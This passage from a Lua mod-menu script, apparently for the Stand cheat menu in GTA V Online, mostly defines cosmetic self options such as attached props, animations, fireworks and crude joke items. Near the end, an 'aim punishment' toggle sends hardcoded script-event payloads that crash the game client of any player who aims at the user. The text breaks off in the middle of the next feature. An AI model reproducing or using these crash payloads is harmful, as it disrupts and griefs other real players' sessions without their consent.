--[[
          _____                   _______                   _____                    _____                    _____          
         /\    \                 /::\    \                 /\    \                  /\    \                  /\    \         
        /::\____\               /::::\    \               /::\____\                /::\    \                /::\    \        
       /:::/    /              /::::::\    \             /::::|   |               /::::\    \              /::::\    \       
      /:::/    /              /::::::::\    \           /:::::|   |              /::::::\    \            /::::::\    \      
     /:::/    /              /:::/~~\:::\    \         /::::::|   |             /:::/\:::\    \          /:::/\:::\    \     
    /:::/____/              /:::/    \:::\    \       /:::/|::|   |            /:::/__\:::\    \        /:::/__\:::\    \    
   /::::\    \             /:::/    / \:::\    \     /:::/ |::|   |           /::::\   \:::\    \      /::::\   \:::\    \   
  /::::::\    \   _____   /:::/____/   \:::\____\   /:::/  |::|___|______    /::::::\   \:::\    \    /::::::\   \:::\    \  
 /:::/\:::\    \ /\    \ |:::|    |     |:::|    | /:::/   |::::::::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\____\ 
/:::/  \:::\    /::\____\|:::|____|     |:::|    |/:::/    |:::::::::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::|    |
\::/    \:::\  /:::/    / \:::\    \   /:::/    / \::/    / ~~~~~/:::/    /\:::\   \:::\   \::/    /\::/   |::::\  /:::|____|
 \/____/ \:::\/:::/    /   \:::\    \ /:::/    /   \/____/      /:::/    /  \:::\   \:::\   \/____/  \/____|:::::\/:::/    / 
          \::::::/    /     \:::\    /:::/    /                /:::/    /    \:::\   \:::\    \            |:::::::::/    /  
           \::::/    /       \:::\__/:::/    /                /:::/    /      \:::\   \:::\____\           |::|\::::/    /   
           /:::/    /         \::::::::/    /                /:::/    /        \:::\   \::/    /           |::| \::/____/    
          /:::/    /           \::::::/    /                /:::/    /          \:::\   \/____/            |::|  ~|          
         /:::/    /             \::::/    /                /:::/    /            \:::\    \                |::|   |          
        /:::/    /               \::/____/                /:::/    /              \:::\____\               \::|   |          
        \::/    /                 ~~                      \::/    /                \::/    /                \:|   |          
         \/____/                                           \/____/                  \/____/                  \|___|      
--]]

dofile(filesystem.scripts_dir() .."BeezyLib/natives.lua")
dofile(filesystem.scripts_dir() .."BeezyLib/xxx.lua")
dofile(filesystem.scripts_dir() .."BeezyLib/functions.lua")
local aalib = require("aalib")
local PlaySound = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000
local logo = directx.create_texture(filesystem.scripts_dir() .. '/HeezyScript/' .. 'BART.png')

--聊天翻译
focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")

util.ensure_package_is_installed("lua/BeezyLib/ScaleformLib")
local sfchat = dofile(filesystem.scripts_dir() .."BeezyLib/ScaleformLib.lua")("multiplayer_chat")
sfchat:draw_fullscreen()
--车速表
local resources_dir = filesystem.scripts_dir() .. '\\HeezyScript\\'.. '\\icluster\\'
needle = directx.create_texture(resources_dir .. 'needle.png')
speedometer_case = directx.create_texture(resources_dir .. 'speedometer_case.png')
check_engine_light = directx.create_texture(resources_dir .. 'check_engine.png')
tach_case = directx.create_texture(resources_dir .. 'tach_case.png')
high_beam = directx.create_texture(resources_dir .. 'highbeam.png')
low_beam = directx.create_texture(resources_dir .. 'lowbeam.png')
tpms = directx.create_texture(resources_dir .. 'tpms.png')
traction_control = directx.create_texture(resources_dir .. 'traction.png')
--

util.on_stop(function()
	util.toast("lua不见啦")
end)                      
util.keep_running()

util.log("██╗  ██╗███████╗███████╗███████╗██╗   ██╗")
util.log("██║  ██║██╔════╝██╔════╝╚══███╔╝╚██╗ ██╔╝")
util.log("███████║█████╗  █████╗    ███╔╝  ╚████╔╝ ")
util.log("██╔══██║██╔══╝  ██╔══╝   ███╔╝    ╚██╔╝  ")
util.log("██║  ██║███████╗███████╗███████╗   ██║   ")
util.log("╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝  ")
util.log(" ******     *******   ******** ********")
util.log("/*////**   **/////** //////** /**///// ")
util.log("/*   /**  **     //**     **  /**      ")
util.log("/******  /**      /**    **   /******* ")
util.log("/*//// **/**      /**   **    /**////  ")
util.log("/*    /**//**     **   **     /**      ")
util.log("/*******  //*******   ********/********")
util.log("///////    ///////   //////// //////// ")
local heezy_root = menu.attach_before(menu.ref_by_path('Stand>Settings'),menu.list(menu.shadow_root(), 'Heezy二代目', {"HeezyLuaScript"}, '', 
function()end))
menu.trigger_commands("HeezyLuaScript")
players_lists = menu.list(heezy_root, "玩家列表", {"playerslist"}, "")
frends_list = menu.list(heezy_root, "好友列表", {"frendlist"}, "")
self_features = menu.list(heezy_root, "自我选项", {"Self option"}, "")
weapon_features = menu.list(self_features, "武器选项", {"Weapon Options"}, "")
interesting_features = menu.list(heezy_root, "娱乐选项", {"Interesting options"}, "")
vehicle_options = menu.list(heezy_root, "载具选项", {"Vehicle Options"}, "")
global_options = menu.list(heezy_root, "全局选项", {"Global Options"}, "")
protection_options = menu.list(heezy_root, "防护选项", {"Protection options"}, "")
model_options = menu.list(heezy_root, "模组选项", {"Model options"}, "")
world_options = menu.list(heezy_root, "世界选项", {"World Options"}, "")
task_options = menu.list(heezy_root, "任务选项", {"Task Options"}, "")
other_options = menu.list(heezy_root, "其他选项", {"Other options"}, "")
util.yield(1000)
local menus = {}
local function player_list(pid)
    menus[pid] = menu.action(players_lists, players.get_name_with_tags(pid), {}, "", function() -- thanks to dangerman and aaron for showing me how to delete players properly
        menu.trigger_commands("Heezy " .. players.get_name(pid))
    end)
end

local function handle_player_list(pid)
    local ref = menus[pid]
    if not players.exists(pid) then
        if ref then
            menu.delete(ref)
            menus[pid] = nil
        end
    end
end

players.on_join(player_list)
players.on_leave(handle_player_list)

local function gen_fren_funcs(name)

	local balls = menu.list(frends_list,name, {"friend "..name}, "", function(); end)

	menu.divider(balls ,name)

	menu.action(balls,"加入战局", {"jf "..name}, "",function()
        
		menu.trigger_commands("join "..name)

	end)

	menu.action(balls,"观看玩家", {"sf "..name}, "",function()

		menu.trigger_commands("namespectate "..name)

	end)

	menu.action(balls,"邀请到战局", {"if "..name}, "",function()

		menu.trigger_commands("invite "..name)

	end)

	menu.action(balls,"打开玩家档案", {"pf "..name}, "",function()

		menu.trigger_commands("nameprofile "..name)

	end)

end

menu.divider(frends_list, "好友:)")

for i = 0 , get_friend_count() do

	local name = get_frined_name(i)

	if name == "*****" then goto yes end

	gen_fren_funcs(name)

	::yes::

end


    local play_fireworks = menu.list(self_features, "放烟花", {}, "")

    menu.toggle(self_features, "举手(按x)",{""}, "",function(state)
        
        handsup = state

        while handsup do

            hhandup()

            util.yield()

        end

    end)


    menu.toggle_loop(self_features, "封号斗罗", {""}, "", function()
        pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.9, 0, 0, 0, 0, 0, 0, 1, 1, 1, 255, 255, 255, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.8, 0, 0, 0, 0, 0, 0, 2, 2, 2, 255, 255, 0, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.7, 0, 0, 0, 0, 0, 0, 3, 3, 3, 255, 0, 255, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.6, 0, 0, 0, 0, 0, 0, 4.5, 4.5, 4.5, 255, 0, 255, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.5, 0, 0, 0, 0, 0, 0, 6, 6, 6, 0, 0, 0, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.4, 0, 0, 0, 0, 0, 0, 9, 9, 9, 0, 0, 0, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.3, 0, 0, 0, 0, 0, 0, 13, 13, 13, 0, 0, 0, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.2, 0, 0, 0, 0, 0, 0, 18, 18, 18, 0, 0, 0, 255, 0, 1, 1, 0, 0, 0, false)
        GRAPHICS.DRAW_MARKER(27, pos.x, pos.y, pos.z-0.1, 0, 0, 0, 0, 0, 0, 24, 24, 24, 255, 0, 0, 255, 0, 1, 1, 0, 0, 0, false)
    end)

    

    menu.toggle(self_features, "忍者跑",{""}, "",function(on)

        local renzhe = "missfbi1"

        local pao = "ledge_loop"

                while not STREAMING.HAS_ANIM_DICT_LOADED(renzhe) do 

                    STREAMING.REQUEST_ANIM_DICT(renzhe)

                    util.yield()

                end

                if on then

                    menu.trigger_commands("walkspeed 3.1")

                    menu.trigger_commands("superrun 0.75")

                    menu.trigger_commands("grace on")

                    TASK.TASK_PLAY_ANIM(players.user_ped(), renzhe, pao, 3, 3, -1, 51, 0, false, false, false)

                    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)

                else

                    menu.trigger_commands("walkspeed 1")

                    menu.trigger_commands("superrun 0")

                    menu.trigger_commands("grace off")

                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())

                    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)

                end

            end)


menu.toggle(self_features, "雪人先生",{""}, "",function(on)
    local zhangzi = "prop_gumball_03"
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)--v_ilev_exball_grey
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end)

menu.toggle(self_features, "666",{""}, "",function(on)
    local six = "prop_mp_num_6"
    if on then     
        attach_to_player(six, 0, 0.0, 0, 1.7, 0, 0,0)
        attach_to_player(six, 0, 1.0, 0, 1.7, 0, 0,0)
        attach_to_player(six, 0, -1.0, 0, 1.7, 0, 0,0)
    else
        delete_object(six)
    end
end)
--scr_sum2_hal_hunted_respawn 土色
--scr_sum2_hal_rider_weak_blue 蓝
--scr_sum2_hal_rider_weak_green 绿
--scr_sum2_hal_rider_weak_orange 橙
--scr_sum2_hal_rider_weak_greyblack 白
menu.toggle(self_features, "万剑归宗",{""}, "",function(on)
    local katana = "prop_cs_katana_01"
    if on then     
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.13, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.13, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        local player_pos = players.get_position(players.user())
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_weak_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    else
        delete_object(katana)
    end
end)
suijijianqi = function(x)
    local r = math.random(1,5)
    return x[r]
end

jianqi = {"scr_sum2_hal_hunted_respawn","scr_sum2_hal_rider_weak_blue","scr_sum2_hal_rider_weak_green","scr_sum2_hal_rider_weak_orange","scr_sum2_hal_rider_weak_greyblack"}
menu.toggle(self_features, "万剑归宗V2", {""}, "右键使用剑气", function(state)
    wanjianguizong_2 = state
    local katana = "prop_cs_katana_01"
    if state then
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.13, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.13, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        while wanjianguizong_2 do
            if util.is_key_down(0x02) then
                menu.trigger_commands("sforcefield on")
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            else
                menu.trigger_commands("sforcefield off")
            end
            util.yield()
    end
    else
        delete_object(katana)
    end
end)

menu.toggle(self_features, "万剑归宗V3", {""}, "", function(state)
    wanjianguizong_3 = state
    local katana = "prop_cs_katana_01"
    if state then
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.13, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.13, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        while wanjianguizong_3 do
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            util.yield(200)
    end
    else
        delete_object(katana)
    end
end)

menu.toggle(self_features, "吉他",{""}, "",function(on)
    local guitar = "prop_acc_guitar_01"
    if on then     
        attach_to_player(guitar, 0, 0, -0.15, 0.25, 0, -50,0)
    else
        delete_object(guitar)
    end
end)

menu.toggle(self_features, "冲浪板",{""}, "",function(on)
    local surf_board = "prop_surf_board_ldn_03"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)

menu.toggle(self_features, "泳圈",{""}, "",function(on)
    local swimming_circle = "prop_beach_ring_01"
    if on then     
        attach_to_player(swimming_circle, 0, 0, 0, 0, 0, 0,0)
    else
        delete_object(swimming_circle)
    end
end)


menu.toggle(self_features,"火人" ,{"burningman"}, "", function(on)
    if not on then 
        for _, p in pairs(looped_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    else
    fireman()
    end
end)


menu.toggle_loop(self_features, "发光", {"FG"}, "", function()
FG()
end)



menu.toggle(self_features, "金色翅膀", {"wring"}, "如果不起作用,那么就是bug", function(on_toggle)
	if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		end
    end)

    local s_forcefield_range = 10
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(self_features, "力场", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)

    menu.toggle_loop(self_features, "镜子", {"mirror"}, "", function()
        if GRAPHICS.UI3DSCENE_IS_AVAILABLE() then
            if GRAPHICS.UI3DSCENE_PUSH_PRESET("CELEBRATION_WINNER") then
                GRAPHICS.UI3DSCENE_ASSIGN_PED_TO_SLOT("CELEBRATION_WINNER", players.user_ped(), 0, 0.0, 0.0, 0.0);
            end
        end
    end)


local placed_firework_boxes = {}

menu.action(play_fireworks,"安放烟花",{},"",function()	

    local animlib = 'anim@mp_fireworks'

    local ptfx_asset = "scr_indep_fireworks"

    local anim_name = 'place_firework_3_box'

    local effect_name = "scr_indep_firework_trailburst"

    request_anim_dict(animlib)

    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.52, 0.0)

    local ped = players.user_ped()

    ENTITY.FREEZE_ENTITY_POSITION(ped, true)

    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)

    util.yield(1500)

    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)

    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)

    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)

    ENTITY.FREEZE_ENTITY_POSITION(ped, false)

    util.yield(1000)

    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)

    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box

end)



menu.action(play_fireworks,"烟花发射",{},"",function(f)	

    if #placed_firework_boxes == 0 then 

        notification("请先安放烟花!")

        return 

    end

    local ptfx_asset = "scr_indep_fireworks"

    local effect_name = "scr_indep_firework_trailburst"

    request_ptfx_asset(ptfx_asset)

    notification("嘭")

    for i=1, 50 do

        for k,box in pairs(placed_firework_boxes) do 

            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)

            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 0.0, 0.0, 0.0)

            util.yield(100)

        end

    end

    for k,box in pairs(placed_firework_boxes) do 

        entities.delete_by_handle(box)

        placed_firework_boxes[box] = nil

    end

end)

menu.toggle(self_features, "弹吉他", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("amb@world_human_musician@guitar@male@idle_a") do 
        STREAMING.REQUEST_ANIM_DICT("amb@world_human_musician@guitar@male@idle_a")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    guitar = OBJECT.CREATE_OBJECT(util.joaat("prop_acc_guitar_01"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@world_human_musician@guitar@male@idle_a", "idle_b", 3, 3, -1, 51, 0, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(guitar, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 24818), -0.1,0.31,0.1,0.0,20.0,150.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(guitar)
    end
end)

menu.toggle_loop(self_features, "上帝之指", {"godfinger"}, "移动实体当你用手指指向他们时。按B键开始指向。", function()
    godfinger()
end)

menu.toggle(self_features, "求助", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("amb@world_human_bum_freeway@male@base") do 
        STREAMING.REQUEST_ANIM_DICT("amb@world_human_bum_freeway@male@base")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    beggers = OBJECT.CREATE_OBJECT(util.joaat("prop_beggers_sign_03"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@world_human_bum_freeway@male@base", "base", 3, 3, -1, 51, 0, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(beggers, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 58868), 0.19,0.18,0.0,5.0,0.0,40.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(beggers)
    end
end)

menu.toggle(self_features, "献花", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@heists@humane_labs@finale@keycards") do 
        STREAMING.REQUEST_ANIM_DICT("anim@heists@humane_labs@finale@keycards")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    rose = OBJECT.CREATE_OBJECT(util.joaat("prop_single_rose"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", 3, 3, -1, 51, 0, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(rose, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 18905), 0.13,0.15,0.0,-100.0,0.0,-20.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(rose)
    end
end)

function request_model(model)
	if STREAMING.IS_MODEL_VALID(model) and not STREAMING.HAS_MODEL_LOADED(model) then
		STREAMING.REQUEST_MODEL(model)
		while not STREAMING.HAS_MODEL_LOADED(model) do
			util.yield()
		end
	end
end

menu.toggle(self_features, "坤坤", {""}, "", function(toggle)
    local model = util.joaat("vw_prop_casino_art_mod_05a")
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    request_model(model)
	spawn = OBJECT.CREATE_OBJECT(model, pos.x, pos.y, pos.z, true, true, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(
        spawn, PLAYER.PLAYER_PED_ID(), ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(PLAYER.PLAYER_PED_ID(), "IK_Head"),
        -0.1, 0, 0,
        180, -90, 0,
        false, true, false, false, 0, true
    )
    if not toggle then
        delete_object(model)
    end
end)

menu.action(self_features, "变成呆逼Boze", {}, "", function ()
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
    local snowman = util.joaat("xm3_prop_xm3_snowman_01b")
    local minitank = util.joaat("minitank")
    request_model(snowman)
    request_model(minitank)
    objb = entities.create_object(snowman, pos)
    vehb = entities.create_vehicle(minitank, pos, 0)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), vehb, -1)
    ENTITY.SET_ENTITY_VISIBLE(vehb, false, false)
    ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false, false)
    util.yield(100)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(objb, vehb, 0, 0, 0, 0, 0, 0, -180, true, false, false, false, 0, true)
    while true do
        if not PED.IS_PED_IN_VEHICLE(players.user_ped(), vehb, false) then
            ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), true, false)
        end
        util.yield()
    end
end)



menu.action(self_features, "拉屎", {}, "", function()

lababa()

end)



menu.action(self_features, '前空翻', {}, '孙行者', function ()
    local hash = util.joaat("prop_ecola_can")
    request_model_load(hash)
    local prop = entities.create_object(hash, players.get_position(players.user()))
    ENTITY.FREEZE_ENTITY_POSITION(prop)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
    for i=1, -360, -16 do
        ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
        util.yield()
    end
    ENTITY.DETACH_ENTITY(players.user_ped())
    entities.delete_by_handle(prop)
end)


menu.action(self_features, '后空翻', {}, '孙行者', function ()
    local hash = util.joaat("prop_ecola_can")
    request_model_load(hash)
    local prop = entities.create_object(hash, players.get_position(players.user()))
    ENTITY.FREEZE_ENTITY_POSITION(prop)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
    for i=1, 360, 16 do
        ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
        util.yield()
    end
    ENTITY.DETACH_ENTITY(players.user_ped())
    entities.delete_by_handle(prop)
end)

    
menu.action(self_features, "飞天扫帚", {""}, "注意:您将对其他玩家不可见.", function()
    local reveal_invis = menu.ref_by_path("Online>Reveal Invisible Players")
    if reveal_invis.value == true then
        util.toast("请禁用显示隐形玩家.")
    return end
    local pos = players.get_position(players.user())
    local broomstick = util.joaat("prop_tool_broom")
    local oppressor = util.joaat("oppressor2")
    request_model(broomstick)
    request_model(oppressor)
    obj = entities.create_object(broomstick, pos)
    veh = entities.create_vehicle(oppressor, pos, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, false)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), veh, -1)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, veh, 0, 0, 0, 0.3, -80.0, 0, 0, true, false, false, false, 0, true) 
end)



menu.action(self_features, "打飞机", {}, "我还需要解释这个吗", function()

dafeiji()

end)

local obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01"}

local opt_pp = {"小鸡巴", "大鸡巴", "超级鸡巴", "删除"}

menu.slider_text(self_features, "获取坤巴", {}, "请选择你的坤巴", opt_pp, function(dick)
            if dick == 1 then
            attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
            end

            if dick == 2 then
            attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
            end

            if dick == 3 then
            attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
            end

            if dick == 4 then
            for k, model in pairs(obj_pp) do 
                delete_object(model)
            end
        end
    end)

local JS_tbls = {}

JS_tbls.alphaPoints = {0, 87, 159, 207, 255}

menu.slider(self_features, '幽灵', {'ghost'}, '修改您人物的不透明度.', 0, 100, 100, 25, function(value)

    ENTITY.SET_ENTITY_ALPHA(players.user_ped(), JS_tbls.alphaPoints[value / 25 + 1], false)

end)

local mzcf = menu.list(weapon_features, "瞄准惩罚", {}, "", function(); end)

menu.toggle_loop(mzcf, '发送脚本事件崩溃', {''}, '如果他瞄准你自动崩溃', function()

    local userPed = players.user_ped()

    if playerIsTargetingEntity(userPed) and karma[userPed] then

        local karmaPid = karma[userPed].pid

        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})

    end

end)



menu.toggle_loop(mzcf, '套笼子', {''}, '打你自动套笼', function()

